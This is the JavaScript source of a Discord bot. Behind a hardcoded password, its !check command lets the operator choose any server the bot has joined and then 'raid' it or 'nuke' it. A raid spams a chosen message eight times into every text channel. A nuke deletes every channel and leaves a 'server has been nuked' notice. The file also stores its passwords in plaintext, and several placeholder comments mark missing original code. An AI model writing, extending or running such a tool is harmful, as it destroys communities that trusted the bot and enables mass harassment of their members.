const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';
const NUKE_PASSWORD = 'meka123';

// In-memory storage for multi-step process
const userSelections = new Map(); // userId => { guildId, step, ... }

const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

const TOKEN = process.env.TOKEN;
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

// Ready
client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);
});

// ====================== MESSAGE COMMANDS ======================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  // Existing commands...
  if (content === '!movebootser') { /* ... keep your original code ... */ }
  if (content === '!nukeback') { /* ... keep your original code ... */ }
  if (content === '!ate') { /* ... keep your original code ... */ }

  // ==================== NEW !CHECK COMMAND ====================
  if (content === '!check') {
    const embed = new EmbedBuilder()
      .setColor('#00ff00')
      .setTitle('🔍 Bot Server Check')
      .setDescription('This will let you select a server and perform actions (Raid / Nuke).\n\n**Password required.**')
      .setFooter({ text: 'Click below to start' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`check_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Primary)
    );

    await message.reply({ embeds: [embed], components: [row], ephemeral: false });
  }
});

// ====================== INTERACTIONS ======================
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const parts = interaction.customId.split('_');
    const action = parts[0];
    const userId = parts[2] || interaction.user.id;

    if (interaction.user.id !== userId) {
      return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
    }

    // ====================== CHECK COMMAND FLOW ======================
    if (action === 'check') {
      // Button → Modal (Password)
      if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
        const modal = new ModalBuilder()
          .setCustomId(`check_modal_${userId}`)
          .setTitle('Enter Password');

        modal.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('password')
            .setLabel('Password')
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
        ));

        return await interaction.showModal(modal);
      }

      // Modal Submit → Show Server Selection
      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
        const password = interaction.fields.getTextInputValue('password');
        if (password !== MAIN_PASSWORD) {
          return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
        }

        const guilds = client.guilds.cache;
        if (guilds.size === 0) {
          return interaction.reply({ content: '❌ Bot is not in any servers.', ephemeral: true });
        }

        const options = guilds.map(g => ({
          label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
          value: g.id
        }));

        const select = new StringSelectMenuBuilder()
          .setCustomId(`check_server_select_${userId}`)
          .setPlaceholder('Select a server')
          .addOptions(options);

        const row = new ActionRowBuilder().addComponents(select);

        await interaction.reply({
          content: '✅ Password accepted. Select a server:',
          components: [row],
          ephemeral: true
        });

        // Store user selection start
        userSelections.set(userId, { step: 'server_selected' });
      }

      // Server Selected → Action Menu (Raid / Nuke)
      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
        const selectedGuildId = interaction.values[0];
        const guild = client.guilds.cache.get(selectedGuildId);

        if (!guild) {
          return interaction.reply({ content: '❌ Server not found.', ephemeral: true });
        }

        userSelections.set(userId, { guildId: selectedGuildId, step: 'action' });

        const row = new ActionRowBuilder().addComponents(
          new StringSelectMenuBuilder()
            .setCustomId(`check_action_select_${userId}`)
            .setPlaceholder('Choose action')
            .addOptions([
              { label: '🔥 Raid', value: 'raid' },
              { label: '☢️ Nuke', value: 'nuke' }
            ])
        );

        await interaction.update({
          content: `**Selected Server:** ${guild.name}\nChoose an action:`,
          components: [row]
        });
      }

      // Action Selected
      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
        const selectedAction = interaction.values[0];
        const userData = userSelections.get(userId);

        if (!userData || !userData.guildId) return;

        if (selectedAction === 'raid') {
          // Modal for raid message
          const modal = new ModalBuilder()
            .setCustomId(`check_raid_modal_${userId}`)
            .setTitle('Raid Message');

          modal.addComponents(new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId('raid_message')
              .setLabel('Message to spam')
              .setStyle(TextInputStyle.Paragraph)
              .setRequired(true)
              .setMaxLength(2000)
          ));

          return await interaction.showModal(modal);
        }

        if (selectedAction === 'nuke') {
          const modal = new ModalBuilder()
            .setCustomId(`check_nuke_modal_${userId}`)
            .setTitle('NUKE CONFIRMATION');

          modal.addComponents(new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId('password')
              .setLabel('Confirm with password')
              .setStyle(TextInputStyle.Short)
              .setRequired(true)
          ));

          return await interaction.showModal(modal);
        }
      }

      // Raid Modal Submit
      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_raid_modal_')) {
        const raidMessage = interaction.fields.getTextInputValue('raid_message');
        const userData = userSelections.get(userId);

        if (!userData || !userData.guildId) return;

        const guild = client.guilds.cache.get(userData.guildId);
        if (!guild) return interaction.reply({ content: '❌ Server not found.', ephemeral: true });

        await interaction.reply({ content: `🚀 Starting raid in **${guild.name}**...`, ephemeral: true });

        // Simple raid: spam in every text channel
        const channels = guild.channels.cache.filter(c => c.type === 0);
        for (const channel of channels.values()) {
          for (let i = 0; i < 8; i++) { // spam 8 times per channel
            channel.send(raidMessage).catch(() => {});
          }
        }

        await interaction.followUp({ content: `✅ Raid message sent in **${channels.size}** channels.`, ephemeral: true });
        userSelections.delete(userId);
      }

      // Nuke Modal Submit
      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
        const password = interaction.fields.getTextInputValue('password');
        if (password !== NUKE_PASSWORD) {
          return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
        }

        const userData = userSelections.get(userId);
        if (!userData || !userData.guildId) return;

        const guild = client.guilds.cache.get(userData.guildId);
        if (!guild) return interaction.reply({ content: '❌ Server not found.', ephemeral: true });

        await interaction.reply({ content: `☢️ Nuking **${guild.name}**...`, ephemeral: true });

        // Delete all channels
        for (const [id, channel] of guild.channels.cache) {
          await channel.delete().catch(() => {});
        }

        // Create new chat channel
        const newChannel = await guild.channels.create({
          name: 'chat',
          type: 0,
          reason: 'Nuke command'
        });

        await newChannel.send('# Server has been nuked by !check command.');

        await interaction.followUp({ content: `✅ Nuke completed in **${guild.name}**.`, ephemeral: true });
        userSelections.delete(userId);
      }
    }

    // ====================== KEEP EXISTING COMMANDS ======================
    // Paste your existing movebootser, nukeback, and ate logic here (unchanged)

  } catch (error) {
    console.error(error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ content: '❌ Something went wrong.', ephemeral: true }).catch(() => {});
    }
  }
});

client.login(TOKEN);
